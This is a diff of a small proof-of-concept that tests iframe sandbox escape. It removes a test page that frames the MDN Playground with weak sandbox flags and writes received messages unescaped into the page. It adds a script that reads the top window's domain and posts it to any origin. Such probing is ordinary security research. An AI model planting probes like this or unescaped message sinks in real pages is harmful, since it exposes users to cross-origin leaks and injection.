@@ -1,21 +1,7 @@
-<!DOCTYPE html>
-<html>
-<head><title>PoC - Sandbox Escape</title></head>
-<body>
-  <h3>Testing sandbox escape</h3>
-
-  <iframe
-    src="https://developer.mozilla.org/en-US/play"
-    sandbox="allow-scripts allow-same-origin"
-    width="800"
-    height="500"
-  ></iframe>
-
-  <script>
-    window.addEventListener("message", (event) => {
-      document.body.innerHTML += `<p style="color:red;">[PoC] Received from iframe: ${event.data}</p>`;
-      console.log("[PoC] Received from iframe:", event.data);
-    });
-  </script>
-</body>
-</html>
+<script>
+try {
+  window.parent.postMessage("TOP: " + window.top.document.domain, "*");
+} catch(e) {
+  window.parent.postMessage("ERR: " + e.message, "*");
+}
+</script>
